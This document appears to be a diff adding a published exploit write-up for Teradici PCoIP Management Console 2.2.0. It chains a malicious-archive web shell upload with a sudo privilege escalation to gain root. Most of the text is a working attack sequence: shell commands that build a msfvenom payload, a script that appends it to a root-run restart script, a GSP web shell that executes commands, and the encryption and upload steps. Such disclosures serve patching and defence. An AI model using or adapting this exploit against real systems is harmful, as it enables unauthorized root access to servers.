@@ -1,0 +1,66 @@
+# Exploit Title: Teradici Management Console 2.2.0 - Web Shell Upload and Privilege Escalation
+# Date: February 22nd, 2017
+# Exploit Author: hantwister
+# Vendor Homepage: http://www.teradici.com/products-and-solutions/pcoip-products/management-console
+# Software Link: https://techsupport.teradici.com/ics/support/DLRedirect.asp?fileID=63583 (login required)
+# Version: 2.2.0
+
+
+Users that can access the Settings > Database Management page can achieve code
+execution as root on older versions of PCoIP MC 2.x. (Based on CentOS 7 x64)
+
+
+Web Shell Upload Vulnerability Overview
+---------------------------------------
+
+Database archives are extracted under /opt/jetty/tmpdeploy. By creating a
+malicious archive with a malicious web script that extracts to the known
+directory /opt/jetty/tmpdeploy/jetty-0.0.0.0-8080-console.war-_console-any-
+it is possible to add or modify class files and XML files pertaining to the
+application.
+
+
+Privilege Escalation Vulnerability Overview
+-------------------------------------------
+
+The jetty user owns the file /opt/jetty/jetty_self_restart.sh, and the same user
+has sudo rights to run that file without a password. By manipulating this file,
+arbitrary code can be run as root.
+
+
+Exploiting The Vulnerabilities
+------------------------------
+
+alice:~$ mkdir -p runasroot/jetty-0.0.0.0-8080-console.war-_console-any-/webapp/images
+alice:~$ cd runasroot
+alice:~/runasroot$ msfvenom (snip) > evil
+alice:~/runasroot$ chmod a+x evil
+alice:~/runasroot$ nano modify_self_restart.sh
+
+#!/bin/bash
+echo /tmp/evil >> /opt/jetty/jetty_self_restart.sh
+
+alice:~/runasroot$ chmod a+x modify_self_restart.sh
+alice:~/runasroot$ cd jetty-0.0.0.0-8080-console.war-_console-any-/webapp/images
+alice:~/runasroot/jetty-0.0.0.0-8080-console.war-_console-any-/webapp/images$ nano runasroot.gsp
+
+<html>
+<head>
+<title>runasroot</title>
+</head>
+<body>
+<pre>
+<% out << "cp /opt/jetty/tmpdeploy/evil /tmp/".execute().text %>
+<% out << "/opt/jetty/tmpdeploy/modify_self_restart.sh".execute().text %>
+<% out << "sudo /opt/jetty/jetty_self_restart.sh".execute().text %>
+</pre>
+</body>
+</html>
+
+alice:~/runasroot/jetty-0.0.0.0-8080-console.war-_console-any-/webapp/images$ cd ../../..
+alice:~/runasroot$ tar -zcf runasroot.tar.gz evil modify_self_restart.sh jetty-0.0.0.0-8080-console.war-_console-any-
+alice:~/runasroot$ openssl enc -e -aes-256-cbc -salt -in runasroot.tar.gz -out runasroot.archive -pass pass:4400Dominion -p
+
+Now, choose to upload runasroot.archive through the Database Management page. An
+error will be displayed that it wasn't a valid archive. Now, navigate to
+https://IP/console/images/runasroot.gsp
